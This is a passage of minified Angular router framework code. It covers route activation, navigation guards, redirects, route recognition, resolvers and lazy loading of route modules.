nh(e,i.targetRouterState,i.currentRouterState,n,r).activate(t),i)),nh=class{constructor(e,n,r,i,o){this.routeReuseStrategy=e,this.futureState=n,this.currState=r,this.forwardEvent=i,this.inputBindingEnabled=o}activate(e){let n=this.futureState._root,r=this.currState?this.currState._root:null;this.deactivateChildRoutes(n,r,e),Od(this.futureState.root),this.activateChildRoutes(n,r,e)}deactivateChildRoutes(e,n,r){let i=ti(n);e.children.forEach(o=>{let s=o.value.outlet;this.deactivateRoutes(o,i[s],r),delete i[s]}),Object.values(i).forEach(o=>{this.deactivateRouteAndItsChildren(o,r)})}deactivateRoutes(e,n,r){let i=e.value,o=n?n.value:null;if(i===o)if(i.component){let s=r.getContext(i.outlet);s&&this.deactivateChildRoutes(e,n,s.children)}else this.deactivateChildRoutes(e,n,r);else o&&this.deactivateRouteAndItsChildren(n,r)}deactivateRouteAndItsChildren(e,n){e.value.component&&this.routeReuseStrategy.shouldDetach(e.value.snapshot)?this.detachAndStoreRouteSubtree(e,n):this.deactivateRouteAndOutlet(e,n)}detachAndStoreRouteSubtree(e,n){let r=n.getContext(e.value.outlet),i=r&&e.value.component?r.children:n,o=ti(e);for(let s of Object.values(o))this.deactivateRouteAndItsChildren(s,i);if(r&&r.outlet){let s=r.outlet.detach(),a=r.children.onOutletDeactivated();this.routeReuseStrategy.store(e.value.snapshot,{componentRef:s,route:e,contexts:a})}}deactivateRouteAndOutlet(e,n){let r=n.getContext(e.value.outlet),i=r&&e.value.component?r.children:n,o=ti(e);for(let s of Object.values(o))this.deactivateRouteAndItsChildren(s,i);r&&(r.outlet&&(r.outlet.deactivate(),r.children.onOutletDeactivated()),r.attachRef=null,r.route=null)}activateChildRoutes(e,n,r){let i=ti(n);e.children.forEach(o=>{this.activateRoutes(o,i[o.value.outlet],r),this.forwardEvent(new Zd(o.value.snapshot))}),e.children.length&&this.forwardEvent(new Yd(e.value.snapshot))}activateRoutes(e,n,r){let i=e.value,o=n?n.value:null;if(Od(i),i===o)if(i.component){let s=r.getOrCreateContext(i.outlet);this.activateChildRoutes(e,n,s.children)}else this.activateChildRoutes(e,n,r);else if(i.component){let s=r.getOrCreateContext(i.outlet);if(this.routeReuseStrategy.shouldAttach(i.snapshot)){let a=this.routeReuseStrategy.retrieve(i.snapshot);this.routeReuseStrategy.store(i.snapshot,null),s.children.onOutletReAttached(a.contexts),s.attachRef=a.componentRef,s.route=a.route.value,s.outlet&&s.outlet.attach(a.componentRef,a.route.value),Od(a.route.value),this.activateChildRoutes(e,null,s.children)}else s.attachRef=null,s.route=i,s.outlet&&s.outlet.activateWith(i,s.injector),this.activateChildRoutes(e,null,s.children)}else this.activateChildRoutes(e,null,r)}},oc=class{constructor(e){this.path=e,this.route=this.path[this.path.length-1]}},ii=class{constructor(e,n){this.component=e,this.route=n}};function _M(t,e,n){let r=t._root,i=e?e._root:null;return fo(r,i,n,[r.value])}function IM(t){let e=t.routeConfig?t.routeConfig.canActivateChild:null;return!e||e.length===0?null:{node:t,guards:e}}function li(t,e){let n=Symbol(),r=e.get(t,n);return r===n?typeof t=="function"&&!Cm(t)?t:e.get(t):r}function fo(t,e,n,r,i={canDeactivateChecks:[],canActivateChecks:[]}){let o=ti(e);return t.children.forEach(s=>{wM(s,o[s.value.outlet],n,r.concat([s.value]),i),delete o[s.value.outlet]}),Object.entries(o).forEach(([s,a])=>vo(a,n.getContext(s),i)),i}function wM(t,e,n,r,i={canDeactivateChecks:[],canActivateChecks:[]}){let o=t.value,s=e?e.value:null,a=n?n.getContext(t.value.outlet):null;if(s&&o.routeConfig===s.routeConfig){let c=EM(s,o,o.routeConfig.runGuardsAndResolvers);c?i.canActivateChecks.push(new oc(r)):(o.data=s.data,o._resolvedData=s._resolvedData),o.component?fo(t,e,a?a.children:null,r,i):fo(t,e,n,r,i),c&&a&&a.outlet&&a.outlet.isActivated&&i.canDeactivateChecks.push(new ii(a.outlet.component,s))}else s&&vo(e,a,i),i.canActivateChecks.push(new oc(r)),o.component?fo(t,null,a?a.children:null,r,i):fo(t,null,n,r,i);return i}function EM(t,e,n){if(typeof n=="function")return n(t,e);switch(n){case"pathParamsChange":return!Kn(t.url,e.url);case"pathParamsOrQueryParamsChange":return!Kn(t.url,e.url)||!vt(t.queryParams,e.queryParams);case"always":return!0;case"paramsOrQueryParamsChange":return!eh(t,e)||!vt(t.queryParams,e.queryParams);case"paramsChange":default:return!eh(t,e)}}function vo(t,e,n){let r=ti(t),i=t.value;Object.entries(r).forEach(([o,s])=>{i.component?e?vo(s,e.children.getContext(o),n):vo(s,null,n):vo(s,e,n)}),i.component?e&&e.outlet&&e.outlet.isActivated?n.canDeactivateChecks.push(new ii(e.outlet.component,i)):n.canDeactivateChecks.push(new ii(null,i)):n.canDeactivateChecks.push(new ii(null,i))}function No(t){return typeof t=="function"}function CM(t){return typeof t=="boolean"}function DM(t){return t&&No(t.canLoad)}function bM(t){return t&&No(t.canActivate)}function SM(t){return t&&No(t.canActivateChild)}function TM(t){return t&&No(t.canDeactivate)}function AM(t){return t&&No(t.canMatch)}function w_(t){return t instanceof Dt||t?.name==="EmptyError"}var qa=Symbol("INITIAL_VALUE");function ci(){return Xe(t=>zs(t.map(e=>e.pipe(bt(1),Hl(qa)))).pipe(O(e=>{for(let n of e)if(n!==!0){if(n===qa)return qa;if(n===!1||MM(n))return n}return!0}),Je(e=>e!==qa),bt(1)))}function MM(t){return _o(t)||t instanceof bo}function NM(t,e){return ce(n=>{let{targetSnapshot:r,currentSnapshot:i,guards:{canActivateChecks:o,canDeactivateChecks:s}}=n;return s.length===0&&o.length===0?T(x(v({},n),{guardsResult:!0})):RM(s,r,i,t).pipe(ce(a=>a&&CM(a)?xM(r,o,t,e):T(a)),O(a=>x(v({},n),{guardsResult:a})))})}function RM(t,e,n,r){return ie(t).pipe(ce(i=>LM(i.component,i.route,n,e,r)),lt(i=>i!==!0,!0))}function xM(t,e,n,r){return ie(e).pipe(Nr(i=>Mr(PM(i.route.parent,r),OM(i.route,r),FM(t,i.path,n),kM(t,i.route,n))),lt(i=>i!==!0,!0))}function OM(t,e){return t!==null&&e&&e(new Kd(t)),T(!0)}function PM(t,e){return t!==null&&e&&e(new qd(t)),T(!0)}function kM(t,e,n){let r=e.routeConfig?e.routeConfig.canActivate:null;if(!r||r.length===0)return T(!0);let i=r.map(o=>Gs(()=>{let s=Mo(e)??n,a=li(o,s),c=bM(a)?a.canActivate(e,t):Rt(s,()=>a(e,t));return gn(c).pipe(lt())}));return T(i).pipe(ci())}function FM(t,e,n){let r=e[e.length-1],o=e.slice(0,e.length-1).reverse().map(s=>IM(s)).filter(s=>s!==null).map(s=>Gs(()=>{let a=s.guards.map(c=>{let l=Mo(s.node)??n,u=li(c,l),d=SM(u)?u.canActivateChild(r,t):Rt(l,()=>u(r,t));return gn(d).pipe(lt())});return T(a).pipe(ci())}));return T(o).pipe(ci())}function LM(t,e,n,r,i){let o=e&&e.routeConfig?e.routeConfig.canDeactivate:null;if(!o||o.length===0)return T(!0);let s=o.map(a=>{let c=Mo(e)??i,l=li(a,c),u=TM(l)?l.canDeactivate(t,e,n,r):Rt(c,()=>l(t,e,n,r));return gn(u).pipe(lt())});return T(s).pipe(ci())}function VM(t,e,n,r){let i=e.canLoad;if(i===void 0||i.length===0)return T(!0);let o=i.map(s=>{let a=li(s,t),c=DM(a)?a.canLoad(e,n):Rt(t,()=>a(e,n));return gn(c)});return T(o).pipe(ci(),E_(r))}function E_(t){return Ml(le(e=>{if(typeof e!="boolean")throw ic(t,e)}),O(e=>e===!0))}function jM(t,e,n,r){let i=e.canMatch;if(!i||i.length===0)return T(!0);let o=i.map(s=>{let a=li(s,t),c=AM(a)?a.canMatch(e,n):Rt(t,()=>a(e,n));return gn(c)});return T(o).pipe(ci(),E_(r))}var So=class{constructor(e){this.segmentGroup=e||null}},To=class extends Error{constructor(e){super(),this.urlTree=e}};function ei(t){return Ar(new So(t))}function UM(t){return Ar(new w(4e3,!1))}function BM(t){return Ar(__(!1,Ve.GuardRejected))}var rh=class{constructor(e,n){this.urlSerializer=e,this.urlTree=n}lineralizeSegments(e,n){let r=[],i=n.root;for(;;){if(r=r.concat(i.segments),i.numberOfChildren===0)return T(r);if(i.numberOfChildren>1||!i.children[A])return UM(`${e.redirectTo}`);i=i.children[A]}}applyRedirectCommands(e,n,r,i,o){if(typeof n!="string"){let a=n,{queryParams:c,fragment:l,routeConfig:u,url:d,outlet:h,params:f,data:g,title:_}=i,C=Rt(o,()=>a({params:f,data:g,queryParams:c,fragment:l,routeConfig:u,url:d,outlet:h,title:_}));if(C instanceof Ut)throw new To(C);n=C}let s=this.applyRedirectCreateUrlTree(n,this.urlSerializer.parse(n),e,r);if(n[0]==="/")throw new To(s);return s}applyRedirectCreateUrlTree(e,n,r,i){let o=this.createSegmentGroup(e,n.root,r,i);return new Ut(o,this.createQueryParams(n.queryParams,this.urlTree.queryParams),n.fragment)}createQueryParams(e,n){let r={};return Object.entries(e).forEach(([i,o])=>{if(typeof o=="string"&&o[0]===":"){let a=o.substring(1);r[i]=n[a]}else r[i]=o}),r}createSegmentGroup(e,n,r,i){let o=this.createSegments(e,n.segments,r,i),s={};return Object.entries(n.children).forEach(([a,c])=>{s[a]=this.createSegmentGroup(e,c,r,i)}),new G(o,s)}createSegments(e,n,r,i){return n.map(o=>o.path[0]===":"?this.findPosParam(e,o,i):this.findOrReturn(o,r))}findPosParam(e,n,r){let i=r[n.path.substring(1)];if(!i)throw new w(4001,!1);return i}findOrReturn(e,n){let r=0;for(let i of n){if(i.path===e.path)return n.splice(r),i;r++}return e}},ih={matched:!1,consumedSegments:[],remainingSegments:[],parameters:{},positionalParamSegments:{}};function $M(t,e,n,r,i){let o=C_(t,e,n);return o.matched?(r=dM(e,r),jM(r,e,n,i).pipe(O(s=>s===!0?o:v({},ih)))):T(o)}function C_(t,e,n){if(e.path==="**")return HM(n);if(e.path==="")return e.pathMatch==="full"&&(t.hasChildren()||n.length>0)?v({},ih):{matched:!0,consumedSegments:[],remainingSegments:n,parameters:{},positionalParamSegments:{}};let i=(e.matcher||jA)(n,t,e);if(!i)return v({},ih);let o={};Object.entries(i.posParams??{}).forEach(([a,c])=>{o[a]=c.path});let s=i.consumed.length>0?v(v({},o),i.consumed[i.consumed.length-1].parameters):o;return{matched:!0,consumedSegments:i.consumed,remainingSegments:n.slice(i.consumed.length),parameters:s,positionalParamSegments:i.posParams??{}}}function HM(t){return{matched:!0,parameters:t.length>0?n_(t).parameters:{},consumedSegments:t,remainingSegments:[],positionalParamSegments:{}}}function Jy(t,e,n,r){return n.length>0&&GM(t,n,r)?{segmentGroup:new G(e,zM(r,new G(n,t.children))),slicedSegments:[]}:n.length===0&&qM(t,n,r)?{segmentGroup:new G(t.segments,WM(t,n,r,t.children)),slicedSegments:n}:{segmentGroup:new G(t.segments,t.children),slicedSegments:n}}function WM(t,e,n,r){let i={};for(let o of n)if(ac(t,e,o)&&!r[it(o)]){let s=new G([],{});i[it(o)]=s}return v(v({},r),i)}function zM(t,e){let n={};n[A]=e;for(let r of t)if(r.path===""&&it(r)!==A){let i=new G([],{});n[it(r)]=i}return n}function GM(t,e,n){return n.some(r=>ac(t,e,r)&&it(r)!==A)}function qM(t,e,n){return n.some(r=>ac(t,e,r))}function ac(t,e,n){return(t.hasChildren()||e.length>0)&&n.pathMatch==="full"?!1:n.path===""}function YM(t,e,n){return e.length===0&&!t.children[n]}var oh=class{};function KM(t,e,n,r,i,o,s="emptyOnly"){return new sh(t,e,n,r,i,s,o).recognize()}var ZM=31,sh=class{constructor(e,n,r,i,o,s,a){this.injector=e,this.configLoader=n,this.rootComponentType=r,this.config=i,this.urlTree=o,this.paramsInheritanceStrategy=s,this.urlSerializer=a,this.applyRedirects=new rh(this.urlSerializer,this.urlTree),this.absoluteRedirectCount=0,this.allowRedirects=!0}noMatchError(e){return new w(4002,`'${e.segmentGroup}'`)}recognize(){let e=Jy(this.urlTree.root,[],[],this.config).segmentGroup;return this.match(e).pipe(O(({children:n,rootSnapshot:r})=>{let i=new Le(r,n),o=new rc("",i),s=iM(r,[],this.urlTree.queryParams,this.urlTree.fragment);return s.queryParams=this.urlTree.queryParams,o.url=this.urlSerializer.serialize(s),{state:o,tree:s}}))}match(e){let n=new ri([],Object.freeze({}),Object.freeze(v({},this.urlTree.queryParams)),this.urlTree.fragment,Object.freeze({}),A,this.rootComponentType,null,{});return this.processSegmentGroup(this.injector,this.config,e,A,n).pipe(O(r=>({children:r,rootSnapshot:n})),tn(r=>{if(r instanceof To)return this.urlTree=r.urlTree,this.match(r.urlTree.root);throw r instanceof So?this.noMatchError(r):r}))}processSegmentGroup(e,n,r,i,o){return r.segments.length===0&&r.hasChildren()?this.processChildren(e,n,r,o):this.processSegment(e,n,r,r.segments,i,!0,o).pipe(O(s=>s instanceof Le?[s]:[]))}processChildren(e,n,r,i){let o=[];for(let s of Object.keys(r.children))s==="primary"?o.unshift(s):o.push(s);return ie(o).pipe(Nr(s=>{let a=r.children[s],c=hM(n,s);return this.processSegmentGroup(e,c,a,s,i)}),$l((s,a)=>(s.push(...a),s)),nn(null),Bl(),ce(s=>{if(s===null)return ei(r);let a=D_(s);return QM(a),T(a)}))}processSegment(e,n,r,i,o,s,a){return ie(n).pipe(Nr(c=>this.processSegmentAgainstRoute(c._injector??e,n,c,r,i,o,s,a).pipe(tn(l=>{if(l instanceof So)return T(null);throw l}))),lt(c=>!!c),tn(c=>{if(w_(c))return YM(r,i,o)?T(new oh):ei(r);throw c}))}processSegmentAgainstRoute(e,n,r,i,o,s,a,c){return it(r)!==s&&(s===A||!ac(i,o,r))?ei(i):r.redirectTo===void 0?this.matchSegmentAgainstRoute(e,i,r,o,s,c):this.allowRedirects&&a?this.expandSegmentAgainstRouteUsingRedirect(e,i,n,r,o,s,c):ei(i)}expandSegmentAgainstRouteUsingRedirect(e,n,r,i,o,s,a){let{matched:c,parameters:l,consumedSegments:u,positionalParamSegments:d,remainingSegments:h}=C_(n,i,o);if(!c)return ei(n);typeof i.redirectTo=="string"&&i.redirectTo[0]==="/"&&(this.absoluteRedirectCount++,this.absoluteRedirectCount>ZM&&(this.allowRedirects=!1));let f=new ri(o,l,Object.freeze(v({},this.urlTree.queryParams)),this.urlTree.fragment,Xy(i),it(i),i.component??i._loadedComponent??null,i,e_(i)),g=nc(f,a,this.paramsInheritanceStrategy);f.params=Object.freeze(g.params),f.data=Object.freeze(g.data);let _=this.applyRedirects.applyRedirectCommands(u,i.redirectTo,d,f,e);return this.applyRedirects.lineralizeSegments(i,_).pipe(ce(C=>this.processSegment(e,r,n,C.concat(h),s,!1,a)))}matchSegmentAgainstRoute(e,n,r,i,o,s){let a=$M(n,r,i,e,this.urlSerializer);return r.path==="**"&&(n.children={}),a.pipe(Xe(c=>c.matched?(e=r._injector??e,this.getChildConfig(e,r,i).pipe(Xe(({routes:l})=>{let u=r._loadedInjector??e,{parameters:d,consumedSegments:h,remainingSegments:f}=c,g=new ri(h,d,Object.freeze(v({},this.urlTree.queryParams)),this.urlTree.fragment,Xy(r),it(r),r.component??r._loadedComponent??null,r,e_(r)),_=nc(g,s,this.paramsInheritanceStrategy);g.params=Object.freeze(_.params),g.data=Object.freeze(_.data);let{segmentGroup:C,slicedSegments:R}=Jy(n,h,f,l);if(R.length===0&&C.hasChildren())return this.processChildren(u,l,C,g).pipe(O(ne=>new Le(g,ne)));if(l.length===0&&R.length===0)return T(new Le(g,[]));let te=it(r)===o;return this.processSegment(u,l,C,R,te?A:o,!0,g).pipe(O(ne=>new Le(g,ne instanceof Le?[ne]:[])))}))):ei(n)))}getChildConfig(e,n,r){return n.children?T({routes:n.children,injector:e}):n.loadChildren?n._loadedRoutes!==void 0?T({routes:n._loadedRoutes,injector:n._loadedInjector}):VM(e,n,r,this.urlSerializer).pipe(ce(i=>i?this.configLoader.loadChildren(e,n).pipe(le(o=>{n._loadedRoutes=o.routes,n._loadedInjector=o.injector})):BM(n))):T({routes:[],injector:e})}};function QM(t){t.sort((e,n)=>e.value.outlet===A?-1:n.value.outlet===A?1:e.value.outlet.localeCompare(n.value.outlet))}function JM(t){let e=t.value.routeConfig;return e&&e.path===""}function D_(t){let e=[],n=new Set;for(let r of t){if(!JM(r)){e.push(r);continue}let i=e.find(o=>r.value.routeConfig===o.value.routeConfig);i!==void 0?(i.children.push(...r.children),n.add(i)):e.push(r)}for(let r of n){let i=D_(r.children);e.push(new Le(r.value,i))}return e.filter(r=>!n.has(r))}function Xy(t){return t.data||{}}function e_(t){return t.resolve||{}}function XM(t,e,n,r,i,o){return ce(s=>KM(t,e,n,r,s.extractedUrl,i,o).pipe(O(({state:a,tree:c})=>x(v({},s),{targetSnapshot:a,urlAfterRedirects:c}))))}function eN(t,e){return ce(n=>{let{targetSnapshot:r,guards:{canActivateChecks:i}}=n;if(!i.length)return T(n);let o=new Set(i.map(c=>c.route)),s=new Set;for(let c of o)if(!s.has(c))for(let l of b_(c))s.add(l);let a=0;return ie(s).pipe(Nr(c=>o.has(c)?tN(c,r,t,e):(c.data=nc(c,c.parent,t).resolve,T(void 0))),le(()=>a++),Rr(1),ce(c=>a===s.size?T(n):Fe))})}function b_(t){let e=t.children.map(n=>b_(n)).flat();return[t,...e]}function tN(t,e,n,r){let i=t.routeConfig,o=t._resolve;return i?.title!==void 0&&!v_(i)&&(o[Ao]=i.title),nN(o,t,e,r).pipe(O(s=>(t._resolvedData=s,t.data=nc(t,t.parent,n).resolve,null)))}function nN(t,e,n,r){let i=Fd(t);if(i.length===0)return T({});let o={};return ie(i).pipe(ce(s=>rN(t[s],e,n,r).pipe(lt(),le(a=>{if(a instanceof bo)throw ic(new yo,a);o[s]=a}))),Rr(1),Ul(o),tn(s=>w_(s)?Fe:Ar(s)))}function rN(t,e,n,r){let i=Mo(e)??r,o=li(t,i),s=o.resolve?o.resolve(e,n):Rt(i,()=>o(e,n));return gn(s)}function Pd(t){return Xe(e=>{let n=t(e);return n?ie(n).pipe(O(()=>e)):T(e)})}var S_=(()=>{class t{buildTitle(n){let r,i=n.root;for(;i!==void 0;)r=this.getResolvedTitleForRoute(i)??r,i=i.children.find(o=>o.outlet===A);return r}getResolvedTitleForRoute(n){return n.data[Ao]}static{this.\u0275fac=function(r){return new(r||t)}}static{this.\u0275prov=E({token:t,factory:()=>y(iN),providedIn:"root"})}}return t})(),iN=(()=>{class t extends S_{constructor(n){super(),this.title=n}updateTitle(n){let r=this.buildTitle(n);r!==void 0&&this.title.setTitle(r)}static{this.\u0275fac=function(r){return new(r||t)(N(qy))}}static{this.\u0275prov=E({token:t,factory:t.\u0275fac,providedIn:"root"})}}return t})(),hh=new I("",{providedIn:"root",factory:()=>({})}),oN=(()=>{class t{static{this.\u0275fac=function(r){return new(r||t)}}static{this.\u0275cmp=Kr({type:t,selectors:[["ng-component"]],standalone:!0,features:[Jr],decls:1,vars:0,template:function(r,i){r&1&&Re(0,"router-outlet")},dependencies:[uh],encapsulation:2})}}return t})();function fh(t){let e=t.children&&t.children.map(fh),n=e?x(v({},t),{children:e}):v({},t);return!n.component&&!n.loadComponent&&(e||n.loadChildren)&&n.outlet&&n.outlet!==A&&(n.component=oN),n}var ph=new I(""),sN=(()=>{class t{constructor(){this.componentLoaders=new WeakMap,this.childrenLoaders=new WeakMap,this.compiler=y(Id)}loadComponent(n){if(this.componentLoaders.get(n))return this.componentLoaders.get(n);if(n._loadedComponent)return T(n._loadedComponent);this.onLoadStartListener&&this.onLoadStartListener(n);let r=gn(n.loadComponent()).pipe(O(T_),le(o=>{this.onLoadEndListener&&this.onLoadEndListener(n),n._loadedComponent=o}),$i(()=>{this.componentLoaders.delete(n)})),i=new Dr(r,()=>new pe).pipe(Cr());return this.componentLoaders.set(n,i),i}loadChildren(n,r){if(this.childrenLoaders.get(r))return this.childrenLoaders.get(r);if(r._loadedRoutes)return T({routes:r._loadedRoutes,injector:r._loadedInjector});this.onLoadStartListener&&this.onLoadStartListener(r);let o=aN(r,this.compiler,n,this.onLoadEndListener).pipe($i(()=>{this.childrenLoaders.delete(r)})),s=new Dr(o,()=>new pe).pipe(Cr());return this.childrenLoaders.set(r,s),s}static{this.\u0275fac=function(r){return new(r||t)}}static{this.\u0275prov=E({token:t,factory:t.\u0275fac,providedIn:"root"})}}return t})();function aN(t,e,n,r){return gn(t.loadChildren()).pipe(O(T_),ce(i=>i instanceof Ji||Array.isArray(i)?T(i):ie(e.compileModuleAsync(i))),O(i=>{r&&r(t);let o,s,a=!1;return Array.isArray(i)?(s=i,a=!0):(o=i.create(n).injector,s=o.get(ph,[],{optional:!0,self:!0}).flat()),{routes:s.map(fh),injector:o}}))}function cN(t){return t&&typeof t=="object"&&"default"in t}function T_(t){return cN(t)?t.default:t}var gh=(()=>{class t{static{this.\u0275fac=function(r){return new(r||t)}}static{this.\u0275prov=E({token:t,factory:()=>y(lN),providedIn:"root"})}}return t})(),lN=(()=>{class t{shouldProcessUrl(n){return!0}extract(n){return n}merge(n,r){return n}static{this.\u0275fac=function(r){return new(r||t)}}static{this.\u0275prov=E({token:t,factory:t.\u0275fac,providedIn:"root"})}}return t})(),uN=new I("");var dN=new I(""),hN=(()=>{class t{get hasRequestedNavigation(){return this.navigationId!==0}constructor(){this.currentNavigation=null,this.currentTransition=null,this.lastSuccessfulNavigation=null,this.events=new pe,this.transitionAbortSubject=new pe,this.configLoader=y(sN),this.environmentInjector=y(He),this.urlSerializer=y(ch),this.rootContexts=y(sc),this.location=y(ao),this.inputBindingEnabled=y(dh,{optional:!0})!==null,this.titleStrategy=y(S_),this.options=y(hh,{optional:!0})||{},this.paramsInheritanceStrategy=this.options.paramsInheritanceStrategy||"emptyOnly",this.urlHandlingStrategy=y(gh),this.createViewTransition=y(uN,{optional:!0}),this.navigationErrorHandler=y(dN,{optional:!0}),this.navigationId=0,this.afterPreactivation=()=>T(void 0),this.rootComponentType=null;let n=i=>this.events.next(new zd(i)),r=i=>this.events.next(new Gd(i));this.configLoader.onLoadEndListener=r,this.configLoader.onLoadStartListener=n}complete(){this.transitions?.complete()}handleNavigationRequest(n){let r=++this.navigationId;this.transitions?.next(x(v(v({},this.transitions.value),n),{id:r}))}setupNavigations(n,r,i){return this.transitions=new ge({id:0,currentUrlTree:r,currentRawUrl:r,extractedUrl:this.urlHandlingStrategy.extract(r),urlAfterRedirects:this.urlHandlingStrategy.extract(r),rawUrl:r,extras:{},resolve:()=>{},reject:()=>{},promise:Promise.resolve(!0),source:mo,restoredState:null,currentSnapshot:i.snapshot,targetSnapshot:null,currentRouterState:i,targetRouterState:null,guards:{canActivateChecks:[],canDeactivateChecks:[]},guardsResult:null}),this.transitions.pipe(Je(o=>o.id!==0),O(o=>x(v({},o),{extractedUrl:this.urlHandlingStrategy.extract(o.rawUrl)})),Xe(o=>{let s=!1,a=!1;return T(o).pipe(Xe(c=>{if(this.navigationId>o.id)return this.cancelNavigationTransition(o,"",Ve.SupersededByNewNavigation),Fe;this.currentTransition=o,this.currentNavigation={id:c.id,initialUrl:c.rawUrl,extractedUrl:c.extractedUrl,targetBrowserUrl:typeof c.extras.browserUrl=="string"?this.urlSerializer.parse(c.extras.browserUrl):c.extras.browserUrl,trigger:c.source,extras:c.extras,previousNavigation:this.lastSuccessfulNavigation?x(v({},this.lastSuccessfulNavigation),{previousNavigation:null}):null};let l=!n.navigated||this.isUpdatingInternalState()||this.isUpdatedBrowserUrl(),u=c.extras.onSameUrlNavigation??n.onSameUrlNavigation;if(!l&&u!=="reload"){let d="";return this.events.next(new Qn(c.id,this.urlSerializer.serialize(c.rawUrl),d,Ud.IgnoredSameUrlNavigation)),c.resolve(!1),Fe}if(this.urlHandlingStrategy.shouldProcessUrl(c.rawUrl))return T(c).pipe(Xe(d=>{let h=this.transitions?.getValue();return this.events.next(new wo(d.id,this.urlSerializer.serialize(d.extractedUrl),d.source,d.restoredState)),h!==this.transitions?.getValue()?Fe:Promise.resolve(d)}),XM(this.environmentInjector,this.configLoader,this.rootComponentType,n.config,this.urlSerializer,this.paramsInheritanceStrategy),le(d=>{o.targetSnapshot=d.targetSnapshot,o.urlAfterRedirects=d.urlAfterRedirects,this.currentNavigation=x(v({},this.currentNavigation),{finalUrl:d.urlAfterRedirects});let h=new Xa(d.id,this.urlSerializer.serialize(d.extractedUrl),this.urlSerializer.serialize(d.urlAfterRedirects),d.targetSnapshot);this.events.next(h)}));if(l&&this.urlHandlingStrategy.shouldProcessUrl(c.currentRawUrl)){let{id:d,extractedUrl:h,source:f,restoredState:g,extras:_}=c,C=new wo(d,this.urlSerializer.serialize(h),f,g);this.events.next(C);let R=g_(this.rootComponentType).snapshot;return this.currentTransition=o=x(v({},c),{targetSnapshot:R,urlAfterRedirects:h,extras:x(v({},_),{skipLocationChange:!1,replaceUrl:!1})}),this.currentNavigation.finalUrl=h,T(o)}else{let d="";return this.events.next(new Qn(c.id,this.urlSerializer.serialize(c.extractedUrl),d,Ud.IgnoredByUrlHandlingStrategy)),c.resolve(!1),Fe}}),le(c=>{let l=new Bd(c.id,this.urlSerializer.serialize(c.extractedUrl),this.urlSerializer.serialize(c.urlAfterRedirects),c.targetSnapshot);this.events.next(l)}),O(c=>(this.currentTransition=o=x(v({},c),{guards:_M(c.targetSnapshot,c.currentSnapshot,this.rootContexts)}),o)),NM(this.environmentInjector,c=>this.events.next(c)),le(c=>{if(o.guardsResult=c.guardsResult,c.guardsResult&&typeof c.guardsResult!="boolean")throw ic(this.urlSerializer,c.guardsResult);let l=new $d(c.id,this.urlSerializer.serialize(c.extractedUrl),this.urlSerializer.serialize(c.urlAfterRedirects),c.targetSnapshot,!!c.guardsResult);this.events.next(l)}),Je(c=>c.guardsResult?!0:(this.cancelNavigationTransition(c,"",Ve.GuardRejected),!1)),Pd(c=>{if(c.guards.canActivateChecks.length)return T(c).pipe(le(l=>{let u=new Hd(l.id,this.urlSerializer.serialize(l.extractedUrl),this.urlSerializer.serialize(l.urlAfterRedirects),l.targetSnapshot);this.events.next(u)}),Xe(l=>{let u=!1;return T(l).pipe(eN(this.paramsInheritanceStrategy,this.environmentInjector),le({next:()=>u=!0,complete:()=>{u||this.cancelNavigationTransition(l,"",Ve.NoDataFromResolver)}}))}),le(l=>{let u=new Wd(l.id,this.urlSerializer.serialize(l.extractedUrl),this.urlSerializer.serialize(l.urlAfterRedirects),l.targetSnapshot);this.events.next(u)}))}),Pd(c=>{let l=u=>{let d=[];u.routeConfig?.loadComponent&&!u.routeConfig._loadedComponent&&d.push(this.configLoader.loadComponent(u.routeConfig).pipe(le(h=>{u.component=h}),O(()=>{})));for(let h of u.children)d.push(...l(h));return d};return zs(l(c.targetSnapshot.root)).pipe(nn(null),bt(1))}),Pd(()=>this.afterPreactivation()),Xe(()=>{let{currentSnapshot:c,targetSnapshot:l}=o,u=this.createViewTransition?.(this.environmentInjector,c.root,l.root);return u?ie(u).pipe(O(()=>o)):T(o)}),O(c=>{let l=pM(n.routeReuseStrategy,c.targetSnapshot,c.currentRouterState);return this.currentTransition=o=x(v({},c),{targetRouterState:l}),this.currentNavigation.targetRouterState=l,o}),le(()=>{this.events.next(new Co)}),yM(this.rootContexts,n.routeReuseStrategy,c=>this.events.next(c),this.inputBindingEnabled),bt(1),le({next:c=>{s=!0,this.lastSuccessfulNavigation=this.currentNavigation,this.events.next(new Zn(c.id,this.urlSerializer.serialize(c.extractedUrl),this.urlSerializer.serialize(c.urlAfterRedirects))),this.titleStrategy?.updateTitle(c.targetRouterState.snapshot),c.resolve(!0)},complete:()=>{s=!0}}),Wl(this.transitionAbortSubject.pipe(le(c=>{throw c}))),$i(()=>{!s&&!a&&this.cancelNavigationTransition(o,"",Ve.SupersededByNewNavigation),this.currentTransition?.id===o.id&&(this.currentNavigation=null,this.currentTransition=null)}),tn(c=>{if(a=!0,I_(c))this.events.next(new jt(o.id,this.urlSerializer.serialize(o.extractedUrl),c.message,c.cancellationCode)),vM(c)?this.events.next(new si(c.url,c.navigationBehaviorOptions)):o.resolve(!1);else{let l=new Eo(o.id,this.urlSerializer.serialize(o.extractedUrl),c,o.targetSnapshot??void 0);try{let u=Rt(this.environmentInjector,()=>this.navigationErrorHandler?.(l));if(u instanceof bo){let{message:d,cancellationCode:h}=ic(this.urlSerializer,u);this.events.next(new jt(o.id,this.urlSerializer.serialize(o.extractedUrl),d,h)),this.events.next(new si(u.redirectTo,u.navigationBehaviorOptions))}else{this.events.next(l);let d=n.errorHandler(c);o.resolve(!!d)}}catch(u){this.options.resolveNavigationPromiseOnError?o.resolve(!1):o.reject(u)}}return Fe}))}))}cancelNavigationTransition(n,r,i){let o=new jt(n.id,this.urlSerializer.serialize(n.extractedUrl),r,i);this.events.next(o),n.resolve(!1)}isUpdatingInternalState(){return this.currentTransition?.extractedUrl.toString()!==this.currentTransition?.currentUrlTree.toString()}isUpdatedBrowserUrl(){let n=this.urlHandlingStrategy.extract(this.urlSerializer.parse(this.location.path(!0))),r=this.currentNavigation?.targetBrowserUrl??this.currentNavigation?.extractedUrl;return n.toString()!==r?.toString()&&!this.currentNavigation?.extras.skipLocationChange}static{this.\u0275fac=function(r){return new(r||t)}}static{this.\u0275prov=E({token:t,factory:t.\u0275fac,providedIn:"root"})}}return t})();function fN(t){return t!==mo}var pN=(()=>{class t{static{this.\u0275fac=function(r){return new(r||t)}}static{this.\u0275prov=E({token:t,factory:()=>y(gN),providedIn:"root"})}}return t})(),ah=class{shouldDetach(e){return!1}store(e,n){}shouldAttach(e){return!1}retrieve(e){return null}shouldReuseRoute(e,n){return e.routeConfig===n.routeConfig}},gN=(()=>{class t extends ah{static{this.\u0275fac=(()=>{let n;return 